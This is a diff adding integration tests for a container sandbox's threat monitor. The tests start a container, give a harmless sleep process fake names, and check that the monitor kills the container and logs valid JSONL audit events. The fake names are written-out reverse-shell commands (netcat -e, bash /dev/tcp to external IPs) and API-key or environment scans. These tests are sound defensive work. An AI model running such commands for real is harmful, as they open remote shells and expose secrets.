@@ -1288,6 +1288,356 @@ enabled = false
             elif config_path.exists():
                 config_path.unlink()
 
+    def test_monitoring_enabled_via_config_only(self, test_workspace, coi_binary):
+        """Test monitoring enabled via config file without --monitor flag."""
+        # Create config with monitoring enabled
+        config_path = Path.home() / ".config" / "coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+"""
+        )
+
+        try:
+            # Start shell WITHOUT --monitor flag (config should enable it)
+            proc = subprocess.Popen(
+                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "19"],
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(8)
+
+            container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-19")
+
+            if get_container_state(container_name) == "Unknown":
+                proc.terminate()
+                pytest.skip(f"Container {container_name} not found")
+
+            # Inject malicious command - should be detected via config-enabled monitoring
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "sh",
+                    "-c",
+                    "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Wait for detection and kill
+            time.sleep(5)
+
+            killed = False
+            for _ in range(15):
+                time.sleep(1)
+                state = get_container_state(container_name)
+                if state in ["Stopped", "Frozen"]:
+                    killed = True
+                    break
+
+            assert killed, "Container should be killed when monitoring enabled via config"
+
+            # Verify threat logged
+            events = get_threat_events(container_name)
+            critical = [e for e in events if e.get("level") == "critical"]
+            assert len(critical) > 0, "Expected CRITICAL threat when config enables monitoring"
+
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+        finally:
+            # Restore original config
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+
+
+class TestMultipleThreats:
+    """Test handling of multiple simultaneous threats."""
+
+    def test_multiple_simultaneous_threats(self, test_workspace, enable_monitoring, coi_binary):
+        """Test that multiple threats are all detected and logged."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "20",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-20")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Inject multiple threats simultaneously
+        # Threat 1: Reverse shell (CRITICAL)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Threat 2: Environment scanning (WARNING)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'printenv' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Threat 3: API key search (WARNING)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'grep -r API_KEY /workspace' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for monitoring to detect all threats
+        time.sleep(5)
+
+        # Container should be killed (CRITICAL takes precedence)
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen"]:
+                killed = True
+                break
+
+        assert killed, "Container should be killed when CRITICAL threat present"
+
+        # Verify all threats are logged
+        events = get_threat_events(container_name)
+
+        # Should have CRITICAL threat(s)
+        critical = [e for e in events if e.get("level") == "critical"]
+        assert len(critical) > 0, "Expected at least one CRITICAL threat"
+
+        # May have WARNING threats too (depending on timing)
+        # Don't assert on warnings count - they may or may not be detected before kill
+
+        # Verify total events captured
+        assert len(events) >= 1, "Expected at least one threat event"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+
+class TestAuditLogValidation:
+    """Test audit log format and structure validation."""
+
+    def test_audit_log_jsonl_format(self, test_workspace, enable_monitoring, coi_binary):
+        """Verify audit log is valid JSONL with all required fields."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "21",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-21")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Trigger a threat to generate audit log entry
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'nc -e /bin/sh 10.0.0.1 9999' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for detection
+        time.sleep(10)
+
+        # Read audit log file directly
+        log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
+        assert log_path.exists(), "Audit log file should exist"
+
+        # Parse and validate JSONL format
+        with open(log_path) as f:
+            lines = [line.strip() for line in f if line.strip()]
+            assert len(lines) > 0, "Audit log should contain at least one event"
+
+            for i, line in enumerate(lines):
+                # Each line should be valid JSON
+                try:
+                    event = json.loads(line)
+                except json.JSONDecodeError as e:
+                    pytest.fail(f"Line {i + 1} is not valid JSON: {e}")
+
+                # Verify required fields
+                required_fields = [
+                    "id",
+                    "timestamp",
+                    "level",
+                    "category",
+                    "title",
+                    "description",
+                    "action",
+                ]
+                for field in required_fields:
+                    assert field in event, f"Missing required field '{field}' in event {i + 1}"
+
+                # Verify field types
+                assert isinstance(event["id"], str), "id should be string"
+                assert isinstance(event["timestamp"], str), "timestamp should be string"
+                assert isinstance(event["level"], str), "level should be string"
+                assert isinstance(event["category"], str), "category should be string"
+                assert isinstance(event["title"], str), "title should be string"
+                assert isinstance(event["description"], str), "description should be string"
+                assert isinstance(event["action"], str), "action should be string"
+
+                # Verify level is valid
+                assert event["level"] in ["info", "warning", "high", "critical"], (
+                    f"Invalid threat level: {event['level']}"
+                )
+
+                # Verify action is valid
+                assert event["action"] in ["logged", "alerted", "paused", "killed", "pending"], (
+                    f"Invalid action: {event['action']}"
+                )
+
+                # Verify evidence field exists and has content
+                assert "evidence" in event, "Missing evidence field"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+    def test_audit_log_evidence_structure(self, test_workspace, enable_monitoring, coi_binary):
+        """Verify evidence data structure in audit log."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "22",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-22")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Trigger environment scanning (easier to verify evidence structure)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'env' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(5)
+
+        # Get events
+        events = get_threat_events(container_name)
+        warnings = [e for e in events if e.get("level") == "warning"]
+
+        if len(warnings) == 0:
+            # Detection might be timing-dependent, don't fail
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            pytest.skip("No WARNING events detected (timing dependent)")
+
+        # Verify evidence structure for process-based threats
+        for event in warnings:
+            evidence = event.get("evidence")
+            assert evidence is not None, "Evidence should not be None"
+
+            # For process threats, evidence should have these fields
+            if event.get("category") == "environment":
+                # Evidence should be a dict with process info
+                assert isinstance(evidence, dict), "Evidence should be a dict for process threats"
+                # Common fields: pid, command, user, pattern
+                # Don't assert on specific fields as structure may vary
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
 
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
